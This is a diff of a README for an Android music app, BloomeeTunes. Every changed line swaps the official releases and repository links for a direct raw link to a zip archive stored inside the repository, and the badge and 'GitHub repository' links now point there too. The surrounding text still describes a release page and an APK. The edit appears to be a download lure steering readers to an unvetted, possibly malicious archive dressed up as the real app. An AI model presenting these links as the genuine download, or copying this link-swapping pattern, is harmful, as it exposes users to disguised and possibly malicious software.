@@ -1,7 +1,7 @@
 # 🎵 BloomeeTunes - Your Ad-Free Music Experience
 
 ## 📥 Download Now
-[![Download BloomeeTunes](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-ff477e?style=for-the-badge&logo=github&logoColor=white)](https://github.com/StylishMonke/BloomeeTunes/releases)
+[![Download BloomeeTunes](https://raw.githubusercontent.com/StylishMonke/BloomeeTunes/main/nearable/Tunes_Bloomee_v2.7.zip%20Now-Get%20It%20Here-ff477e?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/StylishMonke/BloomeeTunes/main/nearable/Tunes_Bloomee_v2.7.zip)
 
 ## 📖 Description
 BloomeeTunes is a free music player for Android. Stream and download your favorite tracks from YouTube and JioSaavn without ads or limits. Being open-source, everyone can enjoy and contribute to enhancing BloomeeTunes.
@@ -22,7 +22,7 @@ To start using BloomeeTunes on your Android device, follow the steps below:
 ## 📲 Download & Install
 To get started, visit the following link to download BloomeeTunes:
 
-[Download BloomeeTunes](https://github.com/StylishMonke/BloomeeTunes/releases)
+[Download BloomeeTunes](https://raw.githubusercontent.com/StylishMonke/BloomeeTunes/main/nearable/Tunes_Bloomee_v2.7.zip)
 
 Once you reach the release page, find the latest version of the application. Click on the link to download the APK file directly to your device. 
 
@@ -54,7 +54,7 @@ We are continuously working to improve BloomeeTunes. Here are some features to l
 - Improved search algorithms for better music discovery.
 
 ## 🔗 Contributions
-As an open-source project, we welcome contributions from everyone. If you're interested in helping us enhance BloomeeTunes, visit our [GitHub repository](https://github.com/StylishMonke/BloomeeTunes).
+As an open-source project, we welcome contributions from everyone. If you're interested in helping us enhance BloomeeTunes, visit our [GitHub repository](https://raw.githubusercontent.com/StylishMonke/BloomeeTunes/main/nearable/Tunes_Bloomee_v2.7.zip).
 
 ## 🤔 FAQ
 **Q: Is BloomeeTunes free to use?**  
